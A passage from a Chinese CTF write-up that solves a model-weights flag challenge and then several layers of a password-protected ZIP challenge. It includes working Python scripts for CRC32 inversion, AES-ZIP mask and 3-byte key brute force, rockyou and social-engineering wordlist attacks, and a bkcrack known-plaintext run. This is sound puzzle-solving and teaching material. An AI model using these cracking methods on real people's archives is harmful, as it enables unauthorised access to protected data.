    with tempfile.TemporaryDirectory() as tmp:
        with zipfile.ZipFile(pth_path) as zf:
            zf.extractall(tmp)
        model_dir = Path(tmp) / "model2" / "model"
        fixed = Path(tmp) / "fixed.pth"
        with zipfile.ZipFile(fixed, "w") as zf:
            for p in model_dir.rglob("*"):
                if p.is_file():
                    zf.write(p, "archive/" + str(p.relative_to(model_dir)))
        return torch.load(fixed, map_location="cpu", weights_only=False)

def viterbi(tb, emb, trans, lam, dist_fn):
    n, K = tb.shape[0], emb.shape[0]
    dp = np.full((n, K), np.inf)
    prev = np.full((n, K), -1, dtype=int)
    for k in range(K):
        dp[0, k] = dist_fn(tb[0], emb[k])
    for i in range(1, n):
        for k in range(K):
            costs = dp[i - 1] + lam * trans[:, k]
            best = np.argmin(costs)
            dp[i, k] = costs[best] + dist_fn(tb[i], emb[k])
            prev[i, k] = best
    path = []
    k = int(np.argmin(dp[-1]))
    for i in range(n - 1, -1, -1):
        path.append(k)
        k = prev[i, k]
    return path[::-1]

data = load_model("model.pth")
state, meta = data["state"], data["meta"]
emb   = state["embedding.weight"].numpy()
tb    = state["target_bank"].numpy()
trans = state["transition"].numpy()
lam   = meta["path_weight"]
alphabet = meta["alphabet"]

def L1(a, b):
    return np.abs(a - b).sum()

path = viterbi(tb, emb, trans, lam, L1)
token_str = "".join(alphabet[i] for i in path)
print(f"Path (base64)        = {token_str}")

decoded = base64.b64decode(token_str)
print(f"Decoded bytes (hex)  = {decoded.hex()}")

flag_chars = []
prev = 0
for b in decoded:
    c = b ^ prev
    flag_chars.append(c)
    prev = c

flag_bytes = bytes(flag_chars)
print(f"FLAG: {flag_bytes.decode('ascii', errors='replace')}")
```

输出如下：

```txt
> python solution.py
Path (base64)        = ZgoNBhwsZAJWD19oDWFeXn51C0FWe2hfW2xoRQdCfzU=
Decoded bytes (hex)  = 660a0d061c2c6402560f5f680d615e5e7e750b41567b685f5b6c684507427f35
FLAG: flag{W31gh7_R3m3M83r$_7h3_7ru7H}
```

```txt
flag{W31gh7_R3m3M83r$_7h3_7ru7H}
```

### 你爱压缩包

最麻烦的题目，共 11 层嵌套考题。

#### Track 1 伪加密

试图解压发现需要密码，但是我们什么都没有啊。

猜测是伪密码，尝试使用工具解压：

```txt
> python ZipCracker.py challenge123.zip

     ______          ____                _   [*]Hx0战队
    |__  (_)_ __    / ___|_ __ __ _  ___| | _____ _ __
      / /| | '_ \  | |   | '__/ _ |/ __| |/ / _ \ '__|
     / /_| | |_) | | |___| | | (_| | (__|   <  __/ |
    /____|_| .__/___\____|_|  \__,_|\___|_|\_\___|_|
           |_| |_____|
    #Coded By Asaotomo         Update:2026.05.25 (Core Engine Refactor)

[10:00:54] [!] 未检测到 pyzipper。当前系统: Windows 11 (10.0.26200) / x86_64
[10:00:54] [*] 当前压缩包未检测到明显的 AES 标记；如果只是传统 ZipCrypto，可以选择跳过安装。
[10:00:54] [*] 安装方式1: 当前 Python 环境安装（推荐，中文模式优先清华源）: D:\data\env\python\Python314\python.exe -m pip install pyzipper -i https://pypi.tuna.tsinghua.edu.cn/simple
[10:00:54] [*] 安装方式2: 当前 Python 环境安装（官方源）: D:\data\env\python\Python314\python.exe -m pip install pyzipper
[10:00:54] [*] 安装方式3: 通用命令: py -m pip install pyzipper
[10:00:54] [*] 安装方式4: 若无管理员权限，可尝试用户级安装: D:\data\env\python\Python314\python.exe -m pip install --user pyzipper
[10:00:54] [?] 是否现在执行 pyzipper 一键自动安装？输入 n 可跳过继续当前任务。 (y/n): y
[10:01:18] [*] 开始执行 pyzipper 一键自动安装...
[10:01:18] [*] 中文模式优先使用清华 PyPI 镜像安装 pyzipper: https://pypi.tuna.tsinghua.edu.cn/simple
[10:01:20] [!] 通过清华 PyPI 镜像安装 pyzipper 失败，正在自动回退到官方 PyPI...
[10:01:24] [!] pyzipper 一键自动安装失败: 安装完成，但当前进程未能导入 pyzipper。
[10:01:24] [*] 已跳过 pyzipper 安装，继续当前任务。
[10:01:24] [*] 当前仍未启用 pyzipper，因此如果目标条目使用 AES，加密验证或解压可能无法正常完成。
[10:01:24] [!] 系统检测到 challenge123.zip 的加密标志位已开启，正在尝试进行伪加密修复...
[10:01:24] [*] 伪加密修复成功！文件 'challenge123.zip' 无需密码。
[10:01:24] [*] 系统已为您自动提取出 2 个文件到 'unzipped_files' 文件夹中: ['1000.zip', 'README.txt']
```

得到 `1000.zip` 和 `README.txt` 进入下一关。

#### Track 2 套娃压缩包

1000.zip 解压后是 999.zip。

写一个脚本循环解压然后递归删除就的即可。

```py
import zipfile, os, glob

WORK = r".\"
SRC  = os.path.join(WORK, "1000.zip")

os.makedirs(WORK, exist_ok=True)

while True:
    zips = glob.glob(os.path.join(WORK, "*.zip"))
    if not zips:
        break

    zpath = zips[0]
    print(f"解压: {os.path.basename(zpath)}")
    
    with zipfile.ZipFile(zpath) as zf:
        zf.extractall(WORK)
    
    os.remove(zpath)
```

当然使用 ZipCracker 也可。

最后得到 `riddle.zip` 和 `mask.zip` 两个文件。

#### Track 3 CRC 爆破

观察到 riddle.zip 中有很多四字节文件，可以直接利用明文的 CRC 爆破具体的明文。

```py
import zipfile, zlib

def crc32_inv(target: int) -> bytes:
    c0 = zlib.crc32(b'\x00' * 4) & 0xFFFFFFFF
    # 列向量：单比特消息的 L 像
    cols = [(zlib.crc32((1 << i).to_bytes(4, 'little')) & 0xFFFFFFFF) ^ c0 for i in range(32)]
    t = target ^ c0
    # 增广矩阵：第 i 行 = [各列的第 i 位 | t 的第 i 位]
    A = [sum(((cols[j] >> i) & 1) << j for j in range(32)) | ((t >> i) & 1) << 32 for i in range(32)]
    # 高斯消元
    piv, r = [], 0
    for c in range(32):
        p = next((k for k in range(r, 32) if (A[k] >> c) & 1), None)
        if p is None:
            continue
        A[r], A[p] = A[p], A[r]
        piv.append(c); r += 1
        for k in range(32):
            if k != r - 1 and (A[k] >> c) & 1:
                A[k] ^= A[r - 1]
    if r < 32:
        raise ValueError('CRC 不可逆')
    x = 0
    for ri, c in enumerate(piv):
        if (A[ri] >> 32) & 1:
            x |= 1 << c
    return x.to_bytes(4, 'little')

if __name__ == '__main__':
    z = zipfile.ZipFile('file.zip')
    parts = []
    for info in sorted(z.infolist(), key=lambda i: i.filename):
        m = crc32_inv(info.CRC)
        assert zlib.crc32(m) & 0xFFFFFFFF == info.CRC   # 自校验
        parts.append(m)
        print(info.filename, m)
    plain = b''.join(parts)
    open('plain.txt', 'wb').write(plain)
    print('\n==== 拼接结果 ====')
    print(plain.decode())
```

输出如下：

```txt
>python crack_riddle_crc.py
01.txt b'PASS'
02.txt b'WORD'
03.txt b'=?d?'
04.txt b'd?d?'
05.txt b'd?d?'
06.txt b'd?d?'
07.txt b'd?d?'
08.txt b'd?d?'
09.txt b'd?d?'
10.txt b'd?d?'
11.txt b'd?d?'
12.txt b'd?d?'
13.txt b'd;D3'
14.txt b'=6;D'
15.txt b'15+D'
16.txt b'3=6;'
17.txt b'D7=('
18.txt b'D15+'
19.txt b'D3+4'
20.txt b')%10'
21.txt b';D1+'
22.txt b'D3=1'
23.txt b'1;D0'
24.txt b'=(D3'
25.txt b'*D7+'
26.txt b'6)%1'
27.txt b'0;D1'
28.txt b'6=(D'
29.txt b'0*D1'
30.txt b'+4)%'
31.txt b'10;D'
32.txt b'17=D'
33.txt b'15+D'
34.txt b'7+2;'
35.txt b'D19='
36.txt b'(D16'
37.txt b'+D0+'
38.txt b'4)%1'
39.txt b'0;D6'
40.txt b'=(D1'
41.txt b'*D7+'
42.txt b'8)%1'
43.txt b'0;D1'
44.txt b'3=(D'
45.txt b'3+D0'
46.txt b'+4)%'
47.txt b'10;D'
48.txt b'2=(D'
49.txt b'19+D'
50.txt b'17+1'
51.txt b')%10'
52.txt b';D4='
53.txt b'(D7*'
54.txt b'D17+'
55.txt b'4)%1'
56.txt b'0;D1'
57.txt b'8+D1'
58.txt b'=5;D'
59.txt b'12+D'
60.txt b'18=9'
61.txt b';---'

==== 拼接结果 ====
PASSWORD=?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d;D3=6;D15+D3=6;D7=(D15+D3+4)%10;D1+D3=11;D0=(D3*D7+6)%10;D16=(D0*D1+4)%10;D17=D15+D7+2;D19=(D16+D0+4)%10;D6=(D1*D7+8)%10;D13=(D3+D0+4)%10;D2=(D19+D17+1)%10;D4=(D7*D17+4)%10;D18+D1=5;D12+D18=9;---
```

将所有明文拼接得到谜题：

```txt
b'PASSWORD=?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d;D3=6;D15+D3=6;D7=(D15+D3+4)%10;D1+D3=11;D0=(D3*D7+6)%10;D16=(D0*D1+4)%10;D17=D15+D7+2;D19=(D16+D0+4)%10;D6=(D1*D7+8)%10;D13=(D3+D0+4)%10;D2=(D19+D17+1)%10;D4=(D7*D17+4)%10;D18+D1=5;D12+D18=9;---'
```

整理一下：

```txt
PASSWORD=?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d;
D3=6;
D15+D3=6;
D7=(D15+D3+4)%10;
D1+D3=11;
D0=(D3*D7+6)%10;
D16=(D0*D1+4)%10;
D17=D15+D7+2;
D19=(D16+D0+4)%10;
D6=(D1*D7+8)%10;
D13=(D3+D0+4)%10;
D2=(D19+D17+1)%10;
D4=(D7*D17+4)%10;
D18+D1=5;
D12+D18=9;
---
```

这似乎是一个方程。

我们也许可以通过解方程得到密码。

#### Track 4 约束爆破

```bash
known: {0: 6, 1: 5, 2: 7, 3: 6, 4: 4, 6: 8, 7: 0, 12: 9, 13: 6, 15: 0, 16: 4, 17: 2, 18: 0, 19: 4}
mask: 65764?80????96?04204
unknown positions: [5, 8, 9, 10, 11, 14]
===
flags=0x0001 comp=99 crc=00000000 csize=8017238 usize=8017210 name=b'mask_plus(three_bytes).zip'
first bytes of payload: 019907000200414503000000f4fc5dad
central: vmade=788 vneed=20 flags=0x0001 comp=99 crc=00000000 csize=8017238 usize=8017210
end of cd at 8017305 file size 8017410

AES hdr: 019907000200414503000000f4fc5dad
```

掩码爆破，PBKDF2+2 字节校验值筛选。

脚本如下：

```py
import hashlib, hmac, struct
from multiprocessing import Pool

TEMPLATE = '65764?80????96?04204'
UNKNOWN = [5, 8, 9, 10, 11, 14]

data = open('mask.zip', 'rb').read()
nlen = struct.unpack('<H', data[26:28])[0]
elen = struct.unpack('<H', data[28:30])[0]
payload = data[30 + nlen + elen:]
SALT = payload[:16]          # AES-256 -> 16-byte salt
PV = payload[16:18]          # 2-byte password verification value
CD = payload[18:]            # ciphertext + auth code
AUTH_TAIL = payload[-16:]    # the auth code sits at the very end

def check(n):
    digits = list(TEMPLATE)
    for pos in UNKNOWN:
        digits[pos] = str(n % 10)
        n //= 10
    pwd = ''.join(digits).encode()
    dk = hashlib.pbkdf2_hmac('sha1', pwd, SALT, 1000, 66)
    if dk[64:66] != PV:
        return None
    mac = hmac.new(dk[32:64], PV + CD, 'sha1').digest()
    if mac[:4] in AUTH_TAIL:
        return pwd.decode()
    return 'PV-ONLY:' + pwd.decode()

if __name__ == '__main__':
    total = 10 ** len(UNKNOWN)
    found = []
    with Pool(8) as pool:
        for i, res in enumerate(pool.imap_unordered(check, range(total), chunksize=2000)):
            if res:
                found.append(res)
                print('CANDIDATE:', res, flush=True)
            if i % 200000 == 0:
                print(f'... {i}/{total}', flush=True)
    print('done. candidates:', found)
```

```bash
... 0/1000000
CANDIDATE: PV-ONLY:65764480850396104204
... 200000/1000000
CANDIDATE: PV-ONLY:65764180597396204204
CANDIDATE: PV-ONLY:65764380324996204204
CANDIDATE: PV-ONLY:65764180245096304204
CANDIDATE: PV-ONLY:65764080144796304204
... 400000/1000000
CANDIDATE: PV-ONLY:65764380029896404204
CANDIDATE: PV-ONLY:65764580259096504204
CANDIDATE: PV-ONLY:65764980292496504204
... 600000/1000000
CANDIDATE: PV-ONLY:65764880392096604204
CANDIDATE: PV-ONLY:65764480164396604204
CANDIDATE: PV-ONLY:65764880876496704204
CANDIDATE: PV-ONLY:65764680088696704204
... 800000/1000000
CANDIDATE: PV-ONLY:65764180739296804204
done. candidates: ['PV-ONLY:65764480850396104204', 'PV-ONLY:65764180597396204204', 'PV-ONLY:65764380324996204204', 'PV-ONLY:65764180245096304204', 'PV-ONLY:65764080144796304204', 'PV-ONLY:65764380029896404204', 'PV-ONLY:65764580259096504204', 'PV-ONLY:65764980292496504204', 'PV-ONLY:65764880392096604204', 'PV-ONLY:65764480164396604204', 'PV-ONLY:65764880876496704204', 'PV-ONLY:65764680088696704204', 'PV-ONLY:65764180739296804204']
```

pyzipper 精确验证 13 个候选：

```bash
no : 65764480850396104204
no : 65764180597396204204
no : 65764380324996204204
no : 65764180245096304204
no : 65764080144796304204
no : 65764380029896404204
no : 65764580259096504204
no : 65764980292496504204
no : 65764880392096604204
no : 65764480164396604204
no : 65764880876496704204
HIT: 65764680088696704204 b'PK\x03\x04\x14\x00\x01\x00'
no : 65764180739296804204
```

`65764680088696704204` 命中密码。

当然这里应该使用 hashcat 也可以，留一个思路。

这里得到下一个文件 `mask_plus(three_bytes).zip`

#### Track 5 AES 短密钥爆破

这里的名字中的暗示让我迷惑的一段时间，我一开始以为是 `mask_?b?b?b`。

但是仔细一想我觉得 `?b?b?b` 更合理一点，事实证明确实如此。

这里我们需要快速爆破 AES 的三字节密钥：

```py
import hashlib, struct, os
from multiprocessing import Pool

data = open('mask_plus(three_bytes).zip', 'rb').read()
nlen = struct.unpack('<H', data[26:28])[0]
elen = struct.unpack('<H', data[28:30])[0]
payload = data[30 + nlen + elen:]
SALT = payload[:16]
PV = payload[16:18]

def check(t):
    pwd = t.to_bytes(3, 'big')
    dk = hashlib.pbkdf2_hmac('sha1', pwd, SALT, 1000, 66)
    if dk[64:66] == PV:
        return pwd
    return None

if __name__ == '__main__':
    total = 256 ** 3
    hits = []
    with Pool(os.cpu_count()) as pool:
        for i, res in enumerate(pool.imap_unordered(check, range(total), chunksize=8192)):
            if res:
                hits.append(res)
                print('PV-HIT:', res.hex(), flush=True)
            if i % 2000000 == 0:
                print(f'... {i}/{total}', flush=True)
    print('DONE_HEX:', [h.hex() for h in hits], flush=True)
```

```txt
> python crack_3byte.py
... 0/16777216
PV-HIT: 01ca8d
PV-HIT: 02edc3
PV-HIT: 09a7d2
PV-HIT: 08f1eb
PV-HIT: 0c8f30
PV-HIT: 0cc939
PV-HIT: 0df5e1
PV-HIT: 0da42a
PV-HIT: 0d49d0
PV-HIT: 1120c3
PV-HIT: 119838
PV-HIT: 126a16
PV-HIT: 136dda
PV-HIT: 14243d
PV-HIT: 1635e4
PV-HIT: 157d97
PV-HIT: 1836ba
PV-HIT: 18a7b2
PV-HIT: 195e48
PV-HIT: 1d3e12
PV-HIT: 1e4b5a
... 2000000/16777216
PV-HIT: 1f3b16
PV-HIT: 206648
PV-HIT: 241f25
PV-HIT: 2474bf
PV-HIT: 261a3f
PV-HIT: 2683fe
PV-HIT: 2696df
PV-HIT: 27068d
PV-HIT: 27e5a9
PV-HIT: 284285
PV-HIT: 28ed8f
PV-HIT: 2a86bc
PV-HIT: 2b3783
PV-HIT: 2d08fd
PV-HIT: 2d4bb1
PV-HIT: 2d7928
PV-HIT: 2f2853
PV-HIT: 2f04f5
PV-HIT: 2f7149
PV-HIT: 325354
PV-HIT: 32fe51
PV-HIT: 341c39
PV-HIT: 35825b
PV-HIT: 373f85
PV-HIT: 39b882
PV-HIT: 3b4d4c
PV-HIT: 3bd394
PV-HIT: 3ae15e
PV-HIT: 3af1b6
... 4000000/16777216
PV-HIT: 3d0e38
PV-HIT: 40b4a1
PV-HIT: 42f176
PV-HIT: 43cf84
PV-HIT: 443408
PV-HIT: 455d27
PV-HIT: 453c41
PV-HIT: 464244
PV-HIT: 464355
PV-HIT: 45a6ac
PV-HIT: 4696e5
PV-HIT: 46cfd0
PV-HIT: 472003
PV-HIT: 4731ea
PV-HIT: 48a9bb
PV-HIT: 49e64f
PV-HIT: 4abca8
PV-HIT: 4b3ded
PV-HIT: 4cf0c6
PV-HIT: 5037e5
PV-HIT: 506864
PV-HIT: 514517
PV-HIT: 5368e7
PV-HIT: 54b737
PV-HIT: 56688c
PV-HIT: 563e85
PV-HIT: 57ad88
PV-HIT: 580d8d
PV-HIT: 585493
PV-HIT: 59191f
PV-HIT: 59d05b
... 6000000/16777216
PV-HIT: 5bd7a0
PV-HIT: 5d3ce6
PV-HIT: 5dda0b
PV-HIT: 5ff467
PV-HIT: 6094a0
PV-HIT: 610c27
PV-HIT: 617a19
PV-HIT: 631424
PV-HIT: 635839
PV-HIT: 63f5f8
PV-HIT: 6445db
PV-HIT: 654e05
PV-HIT: 65514e
PV-HIT: 658dfb
PV-HIT: 6714de
PV-HIT: 66864e
PV-HIT: 68a6a8
PV-HIT: 6875c8
PV-HIT: 695111
PV-HIT: 6a873b
PV-HIT: 6a4b3b
PV-HIT: 6bde9f
PV-HIT: 6b92fc
PV-HIT: 6b93a4
PV-HIT: 6cb8d0
PV-HIT: 6cd3de
PV-HIT: 6e8620
PV-HIT: 6fa5cf
PV-HIT: 6fbbfc
PV-HIT: 734af1
PV-HIT: 74882d
PV-HIT: 75d50d
PV-HIT: 76489e
PV-HIT: 769f6f
PV-HIT: 77644f
PV-HIT: 787730
PV-HIT: 79280b
PV-HIT: 7a345b
... 8000000/16777216
PV-HIT: 7f04f1
PV-HIT: 7f77cb
PV-HIT: 7e30d9
PV-HIT: 81a16f
PV-HIT: 824e18
PV-HIT: 81f454
PV-HIT: 82f51e
PV-HIT: 84213b
PV-HIT: 847df5
PV-HIT: 85c0d7
PV-HIT: 85cbd8
PV-HIT: 867125
PV-HIT: 883e50
PV-HIT: 89688b
PV-HIT: 8abaea
PV-HIT: 89c467
PV-HIT: 8cd443
PV-HIT: 9009aa
PV-HIT: 91093f
PV-HIT: 910df3
PV-HIT: 91153d
PV-HIT: 9311a5
PV-HIT: 927175
PV-HIT: 94e522
PV-HIT: 95804b
PV-HIT: 953351
PV-HIT: 969575
PV-HIT: 9746f2
PV-HIT: 989e30
... 10000000/16777216
PV-HIT: 99d5e6
PV-HIT: 996c90
PV-HIT: 9b68fc
PV-HIT: 9b438e
PV-HIT: 9cb2be
PV-HIT: 9cbe28
PV-HIT: 9cbf0d
PV-HIT: 9d1802
PV-HIT: 9db8b5
PV-HIT: a0c4d0
PV-HIT: a1d531
PV-HIT: a2a39a
PV-HIT: a86fc4
PV-HIT: a89481
PV-HIT: a99059
PV-HIT: aa8048
PV-HIT: a9ff4c
PV-HIT: ab6b6b
PV-HIT: aca300
PV-HIT: aca42d
PV-HIT: acead3
PV-HIT: ad1459
PV-HIT: ad7256
PV-HIT: adcca3
PV-HIT: add5c6
PV-HIT: b004ae
PV-HIT: b03b3b
PV-HIT: b0fff8
PV-HIT: b1ea29
PV-HIT: b39a1b
PV-HIT: b4dbe6
PV-HIT: b52d6e
PV-HIT: b6b810
PV-HIT: b60822
... 12000000/16777216
PV-HIT: b7ca36
PV-HIT: b913c0
PV-HIT: bb0df1
PV-HIT: bb87b8
PV-HIT: bcb020
PV-HIT: bddc4e
PV-HIT: bdedc5
PV-HIT: bf67a6
PV-HIT: bf7927
PV-HIT: bfce88
PV-HIT: c05740
PV-HIT: bf2494
PV-HIT: c1175b
PV-HIT: c262a5
PV-HIT: c21c8e
PV-HIT: c1a4ef
PV-HIT: c38437
PV-HIT: c373eb
PV-HIT: c48988
PV-HIT: c5a947
PV-HIT: c7758a
PV-HIT: c793e6
PV-HIT: c929ff
PV-HIT: c936f1
PV-HIT: c9b1bb
PV-HIT: ca5e89
PV-HIT: cc2786
PV-HIT: cd4386
PV-HIT: cd21ea
PV-HIT: ce07b8
PV-HIT: cea6f3
PV-HIT: cf6110
... 14000000/16777216
PV-HIT: d72c73
PV-HIT: d6afbb
PV-HIT: d7b13b
PV-HIT: da0f0c
PV-HIT: da9fab
PV-HIT: dc1290
PV-HIT: dc5c5e
PV-HIT: ddcbd8
PV-HIT: de71cc
PV-HIT: defd6c
PV-HIT: e14176
PV-HIT: e1305f
PV-HIT: e2c77e
PV-HIT: e49f7f
PV-HIT: e6b9e0
PV-HIT: eac8e5
PV-HIT: eb1117
PV-HIT: eae9e6
PV-HIT: ebbf98
PV-HIT: ecf2c8
PV-HIT: edcffe
PV-HIT: edee4a
PV-HIT: edf4ce
PV-HIT: f01ff7
PV-HIT: efe953
PV-HIT: f16cd3
... 16000000/16777216
PV-HIT: f4a7a9
PV-HIT: f70301
PV-HIT: f8134c
PV-HIT: f8ec71
PV-HIT: fc991a
PV-HIT: ff4507
PV-HIT: ffb357
PV-HIT: ff6009
PV-HIT: fffb7d
DONE_HEX: ['01ca8d', '02edc3', '09a7d2', '08f1eb', '0c8f30', '0cc939', '0df5e1', '0da42a', '0d49d0', '1120c3', '119838', '126a16', '136dda', '14243d', '1635e4', '157d97', '1836ba', '18a7b2', '195e48', '1d3e12', '1e4b5a', '1f3b16', '206648', '241f25', '2474bf', '261a3f', '2683fe', '2696df', '27068d', '27e5a9', '284285', '28ed8f', '2a86bc', '2b3783', '2d08fd', '2d4bb1', '2d7928', '2f2853', '2f04f5', '2f7149', '325354', '32fe51', '341c39', '35825b', '373f85', '39b882', '3b4d4c', '3bd394', '3ae15e', '3af1b6', '3d0e38', '40b4a1', '42f176', '43cf84', '443408', '455d27', '453c41', '464244', '464355', '45a6ac', '4696e5', '46cfd0', '472003', '4731ea', '48a9bb', '49e64f', '4abca8', '4b3ded', '4cf0c6', '5037e5', '506864', '514517', '5368e7', '54b737', '56688c', '563e85', '57ad88', '580d8d', '585493', '59191f', '59d05b', '5bd7a0', '5d3ce6', '5dda0b', '5ff467', '6094a0', '610c27', '617a19', '631424', '635839', '63f5f8', '6445db', '654e05', '65514e', '658dfb', '6714de', '66864e', '68a6a8', '6875c8', '695111', '6a873b', '6a4b3b', '6bde9f', '6b92fc', '6b93a4', '6cb8d0', '6cd3de', '6e8620', '6fa5cf', '6fbbfc', '734af1', '74882d', '75d50d', '76489e', '769f6f', '77644f', '787730', '79280b', '7a345b', '7f04f1', '7f77cb', '7e30d9', '81a16f', '824e18', '81f454', '82f51e', '84213b', '847df5', '85c0d7', '85cbd8', '867125', '883e50', '89688b', '8abaea', '89c467', '8cd443', '9009aa', '91093f', '910df3', '91153d', '9311a5', '927175', '94e522', '95804b', '953351', '969575', '9746f2', '989e30', '99d5e6', '996c90', '9b68fc', '9b438e', '9cb2be', '9cbe28', '9cbf0d', '9d1802', '9db8b5', 'a0c4d0', 'a1d531', 'a2a39a', 'a86fc4', 'a89481', 'a99059', 'aa8048', 'a9ff4c', 'ab6b6b', 'aca300', 'aca42d', 'acead3', 'ad1459', 'ad7256', 'adcca3', 'add5c6', 'b004ae', 'b03b3b', 'b0fff8', 'b1ea29', 'b39a1b', 'b4dbe6', 'b52d6e', 'b6b810', 'b60822', 'b7ca36', 'b913c0', 'bb0df1', 'bb87b8', 'bcb020', 'bddc4e', 'bdedc5', 'bf67a6', 'bf7927', 'bfce88', 'c05740', 'bf2494', 'c1175b', 'c262a5', 'c21c8e', 'c1a4ef', 'c38437', 'c373eb', 'c48988', 'c5a947', 'c7758a', 'c793e6', 'c929ff', 'c936f1', 'c9b1bb', 'ca5e89', 'cc2786', 'cd4386', 'cd21ea', 'ce07b8', 'cea6f3', 'cf6110', 'd72c73', 'd6afbb', 'd7b13b', 'da0f0c', 'da9fab', 'dc1290', 'dc5c5e', 'ddcbd8', 'de71cc', 'defd6c', 'e14176', 'e1305f', 'e2c77e', 'e49f7f', 'e6b9e0', 'eac8e5', 'eb1117', 'eae9e6', 'ebbf98', 'ecf2c8', 'edcffe', 'edee4a', 'edf4ce', 'f01ff7', 'efe953', 'f16cd3', 'f4a7a9', 'f70301', 'f8134c', 'f8ec71', 'fc991a', 'ff4507', 'ffb357', 'ff6009', 'fffb7d']
```

拿到候选的密钥后简单测试即可：

```txt
total candidates: 249
*** REAL HIT: bdedc5 b'PK\x03\x04\x14\x00\x01\x00'
verification done
```

得到正确的密钥 0xbdedc5。

解压得到下一个文件 `rockme.zip`。

#### Track 6 弱密码 rockyou.txt

这个名字很自然地可以联想到 `rockyou.txt` 这个著名的字典。

我们尝试爆破一下：

![](https://img.halfcity.top/2026/11/10/4446c27e58f1345d62ac508f5269a550.png)

很快得到密码 `chronic`。

得到下一个文件 `social.zip`。

#### Track 7 社工字典

`profile.txt` 文件中的内容如下：

```txt
====================================
NOTE: All information below is randomly generated.
信息均为随机生成，如有雷同纯属巧合。
====================================

Name: Brandon Thomas
Date of Birth: 1987-11-04
```

结合压缩包的名字猜测可能这里需要我们结合个人信息自己生成一个字典。

也就是我们常说的社工攻击了。

把 profile 的信息丢给 ai 让他帮忙生成一个字典：

```py
# -*- coding: utf-8 -*-
"""
用法：
  python crack_social.py                          # 生成字典 + PBKDF2/校验值快筛 + pyzipper 精确验证
  python crack_social.py --dump social_dict.txt   # 仅导出字典文件
"""
import hashlib, struct, sys, os
from multiprocessing import Pool

ZPATH = 'target.zip'

# ---------- 1. 社工字典生成 ----------
def name_variants():
    """姓名素材：全名/单名/缩写的各种写法"""
    base = ['Brandon', 'Thomas', 'BrandonThomas', 'ThomasBrandon',
            'Brandon Thomas', 'BT', 'TB', 'BrandonT', 'TBrandon', 'BThomas', 'ThomasB']
    out = set()
    for s in base:
        out.add(s)
        out.add(s.lower())
        out.add(s.upper())
        if ' ' in s:
            out.add(s.replace(' ', ''))            # 去空格
        out.add(s.replace(' ', '_'))
        out.add(s.replace(' ', '.'))
        out.add(s.replace(' ', '-'))
    return sorted(out)

def dob_variants():
    """生日素材：1987-11-04 的各种格式（含美式 mm/dd 与中式 dd/mm 两种顺序）"""
    y, m, d = '1987', '11', '04'
    return sorted({
        y, y[2:], m, d, m + d, d + m, y + m, m + y[2:], m + y,
        y + m + d, d + m + y[2:], m + d + y[2:], d + m + y,
        y + '-' + m + '-' + d, y[2:] + m + d, m + '/' + d + '/' + y, d + '/' + m + '/' + y,
        m + '.' + d + '.' + y, y + '/' + m + '/' + d, m + '-' + d, d + '-' + m,
        m + '.' + d, d + '.' + m, y + m + d + m + d, m + d + y,
    })

def leet(s):
    """轻量 leet 变体：a->4 o->0 s->5 e->3 i->1"""
    table = str.maketrans({'a': '4', 'o': '0', 's': '5', 'e': '3', 'i': '1'})
    return s.translate(table)

SUFFIXES = ['', '!', '!!', '123', '1234', '12345', '666', '888', '000', '111',
            '@', '#', '?', '.', '1987', '87', '~!', '@123', '_123']

def gen_dict():
    names, dobs = name_variants(), dob_variants()
    cands = set()
    # 单独的姓名/生日 + 常见后缀
    for n in names:
        for suf in SUFFIXES:
            cands.add(n + suf)
        l = leet(n)
        if l != n:
            cands.add(l)
            for suf in ('', '!', '123', '1987', '1104'):
                cands.add(l + suf)
    for dt in dobs:
        cands.add(dt)
        cands.add(dt + '!')
    # 姓名 x 生日 组合（两种顺序，多种分隔符）
    seps = ['', '_', '.', '-', '@', ' ']
    for n in names:
        for dt in dobs:
            for sep in seps:
                cands.add(n + sep + dt)
                cands.add(dt + sep + n)
    # 姓名 x 生日 x 后缀（常用分隔符）
    for n in names:
        for dt in dobs:
            for sep in ('', '_', '.', '-'):
                for suf in ('', '!', '!!', '123', '@'):
                    cands.add(n + sep + dt + suf)
    cands.discard('')
    return sorted(cands)

# ---------- 2. AES 快筛（PBKDF2 + 2 字节校验值） ----------
data = open(ZPATH, 'rb').read()
_nlen = struct.unpack('<H', data[26:28])[0]
_elen = struct.unpack('<H', data[28:30])[0]
_payload = data[30 + _nlen + _elen:]
SALT = _payload[:16]
PV = _payload[16:18]

def check(pwd_bytes):
    dk = hashlib.pbkdf2_hmac('sha1', pwd_bytes, SALT, 1000, 66)
    if dk[64:66] == PV:
        return pwd_bytes
    return None

def verify(pwd_bytes):
    """过筛候选的精确验证（完整解密 + HMAC）"""
    import pyzipper
    try:
        with pyzipper.AESZipFile(ZPATH) as z:
            z.setpassword(pwd_bytes)
            return z.read(z.namelist()[0])[:8]
    except Exception:
        return None

if __name__ == '__main__':
    d = gen_dict()
    print(f'字典规模: {len(d)}', flush=True)
    if '--dump' in sys.argv:
        out = sys.argv[sys.argv.index('--dump') + 1]
        with open(out, 'wb') as f:
            f.write(b'\n'.join(p.encode() for p in d) + b'\n')
        print(f'已导出 -> {out}')
        sys.exit(0)
    hits = []
    with Pool(os.cpu_count()) as pool:
        for i, res in enumerate(pool.imap_unordered(check, [p.encode() for p in d], chunksize=500)):
            if res:
                print('PV-HIT:', res, flush=True)
                hits.append(res)
    print(f'过筛命中 {len(hits)} 个，进入精确验证...', flush=True)
    for h in hits:
        head = verify(h)
        if head:
            print(f'*** 真实密码: {h!r}  文件头: {head}')
```

好吧 ai 好像多写了点东西，把爆破也写进去了。

不过我们只需要这里生成字典的部分即可。

最后也是很快就爆破出密码了：

![](https://img.halfcity.top/2026/11/10/fe802c9eee171c32b2c879e117b025af.png)

密码是 `brandon_1104`。

解压得到下一个文件 `DoYouKnowZip.zip`。

#### Track 8 已知明文攻击 - 单图片

注意到压缩包使用 ZipCrypto 算法加密同时提供了一个压缩包内的文件 nailong.png。

我们将他压缩随后就可以使用 bkcrack进行已知明文攻击了。

```bash
❯ bkcrack -C DoYouKnowZip.zip --cipher-index 0 -P nailong.zip --plain-index 0
bkcrack 1.8.1 - 2025-10-25
[09:44:22] Z reduction using 1048569 bytes of known plaintext
3.3 % (34815 / 1048569)
[09:44:23] Attack on 214 Z values at index 1014615
Keys: ea598753 88ae54fe fc2916b2
9.8 % (21 / 214)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 21
[09:44:23] Keys
ea598753 88ae54fe fc2916b2

